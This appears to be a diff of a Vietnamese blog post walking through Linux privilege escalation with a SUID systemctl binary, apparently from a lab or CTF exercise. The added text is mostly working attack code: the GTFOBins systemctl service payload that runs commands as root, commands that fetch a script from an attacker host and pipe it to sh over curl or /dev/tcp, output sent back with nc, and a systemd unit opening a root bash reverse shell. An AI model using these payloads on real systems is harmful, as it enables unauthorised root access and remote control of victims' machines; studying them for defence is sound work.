@@ -1699,7 +1699,7 @@
 <div class="single__infos">
   <time class="single__info" title="Written At">📅&nbsp;Nov 5, 2021 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;3&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;5&nbsp;min read </span>
   
   &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">🤖&nbsp;ch1nhpd</span>
   
@@ -1763,7 +1763,7 @@
 <p>Ở phần này, nhiệm vụ của chúng ra là leo được lên thành root user nhờ vào <code>systemctl</code> và SUID. Để có thể làm được, trước tiên ta cần hiểu SUID là gì đã.</p>
 <p>Hiểu đơn giản thì <a href="https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd">SUID</a> là một loại quyền đặc biệt. Quyền này cho phép file được thực thi(executes) dưới quyền của chủ sở hữu nó cho dù người chạy file đó là bất kì ai. Khi một file được gắn quyền SUID thì bit <code>x</code> được thay thế thành bit <code>s</code>.</p>
 <p><img src="https://ch1nhpd.github.io/images/posts/suid.png" alt="suid" /></p>
-<p>Tiếp theo là ta cần nắm được cách tìm kiếm những file được gắn quyền SUID để có thể tiếp tục khai thác.</p>
+<p>Tiếp theo là ta cần nắm được cách <em>tìm kiếm những file được gắn quyền SUID</em> để có thể tiếp tục khai thác.</p>
 <blockquote>
 <p><span style="color:lime">  find / -perm /4000 -user root -type f 2&gt; /dev/null   </span></p>
 </blockquote>
@@ -1775,7 +1775,106 @@
 <li><code>-type f</code>: chỉ định loại file tìm kiếm</li>
 <li><code>2&gt; /dev/null</code>: Khi tìm kiếm bằng user bình thường thì có những thư mục mình ko thể truy cập vào được, nên nó sẽ hiện lỗi ra làm rối hết cả mắt. Vì vậy ta dùng lệnh này để ghi những cái lỗi đó vào /dev/null. Số 2 ở đây là nói đến những dòng lỗi, ngược lại nếu muốn ghi những dòng không lỗi vào đâu đó thì thay số 2 bằng số 1. Còn file /dev/null thì là một nơi mà mình ghi gì vào cũng được nhưng khi đọc thì nó không hiện ra cái gì hết.</li>
 </ul>
-<p>[đang cập nhật&hellip;.]</p>
+<p>Ta có thể tìm tên các file đó trên <a href="https://gtfobins.github.io/">GTFOBins </a> thì thấy có thể leo root được bằng cách sử dụng <code>systemctl</code>.</p>
+<p>Nói qua về systemctl thì:</p>
+<div style="background-color:darkslategray; vertical-align: middle; padding:5px 30px;">
+Systemctl là một tiện ích dòng lệnh, có nhiệm vụ điều khiển hệ thống systemd và service manager. Systemd là một bộ công cụ để quản lý hệ thống Linux, nó được sử dụng để khởi động máy, quản lý dịch vụ, hệ thống file tự động, ghi sự kiện, thiết lập tên máy chủ và các tác vụ hệ thống khác. Systemd sử dụng các khái niệm unit, package, service, socket.</br>
+Systemctl được sử dụng để kiểm soát systemd và quản lý các dịch vụ. Nó là một phần của hệ sinh thái systemd và có sẵn theo mặc định trên tất cả các hệ thống.</br>
+Với Systemctl bạn có thể kiểm tra được trạng thái của các service, khởi động và tắt service, gỡ rối hệ thống khi xảy ra sự cố.
+</div>
+</br>
+Như trên GTFOBins đã viết thì ta có thể sử dụng payload sau để trở thành root user:
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-privEsc.sh" data-lang="privEsc.sh">sudo install -m <span class="o">=</span>xs <span class="k">$(</span>which systemctl<span class="k">)</span>
+<span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service
+<span class="nb">echo</span> <span class="s1">&#39;[Service]
+</span><span class="s1">Type=oneshot
+</span><span class="s1">ExecStart=/bin/sh -c &#34;cat /root/root.txt &gt; /tmp/output&#34;
+</span><span class="s1">[Install]
+</span><span class="s1">WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$TF</span>
+/bin/systemctl link <span class="nv">$TF</span>
+/bin/systemctl <span class="nb">enable</span> --now <span class="nv">$TF</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Lưu ý là ta có thể sửa đoạn <code>cat /root/root.txt &gt; /tmp/output</code> thành bất kì lệnh nào ta muốn chạy trên server victim. <br />
+Chúng ta có thể chạy từng dòng trong payload trên hoặc tạo file sẵn trong máy mình rồi gửi đến máy victim. Dưới đây là một số cách để gửi và chạy file payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Local network</span>
+sudo python -m SimpleHTTPServer <span class="m">80</span> <span class="c1">#Host</span>
+curl 10.10.10.10/privEsc.sh <span class="p">|</span> sh <span class="c1">#Victim</span>
+
+<span class="c1">#Without curl</span>
+sudo nc -q <span class="m">5</span> -lvnp <span class="m">80</span> &lt; privEsc.sh <span class="c1">#Host</span>
+cat &lt; /dev/tcp/10.10.10.10/80 <span class="p">|</span> sh <span class="c1">#Victim</span>
+
+<span class="c1">#Excute from memory and send output back to the host</span>
+nc -lvnp <span class="m">9002</span> <span class="p">|</span> tee privEsc.out <span class="c1">#Host</span>
+curl 10.10.14.20:8000/privEsc.sh <span class="p">|</span> sh <span class="p">|</span> nc 10.10.14.20 <span class="m">9002</span> <span class="c1">#Victim</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Ngoài ra mình còn tìm thấy một cái payload cho phép mình điều khiển trực tiếp victim qua netcat như sau:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-root.service" data-lang="root.service"><span class="k">[Unit]</span>
+<span class="na">Description</span><span class="o">=</span><span class="s">root</span>
+
+<span class="k">[Service]</span>
+<span class="na">Type</span><span class="o">=</span><span class="s">simple</span>
+<span class="na">User</span><span class="o">=</span><span class="s">root</span>
+<span class="na">ExecStart</span><span class="o">=</span><span class="s">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/Your_ip/port_nc 0&gt;&amp;1&#39;</span>
+
+<span class="k">[Install]</span>
+<span class="na">WantedBy</span><span class="o">=</span><span class="s">multi-user.target</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Vẫn thực hiện chuyển file payload đến máy victim rồi tại máy mình chạy lệnh sau:</p>
+<blockquote>
+<p><span style="color:lime">  nc -nvlp port_nc </span></p>
+</blockquote>
+<p>Tại máy victim lần lượt chạy:</p>
+<blockquote>
+<p><span style="color:lime">  systemctl enable root.service   </span><br />
+<span style="color:lime">  systemctl start root   </span></p>
+</blockquote>
+<p>Vậy là ta có thể điều khiểm máy victim dưới quyền root rồi&hellip; Happy hacking!!!</p>
 
   </article>
   
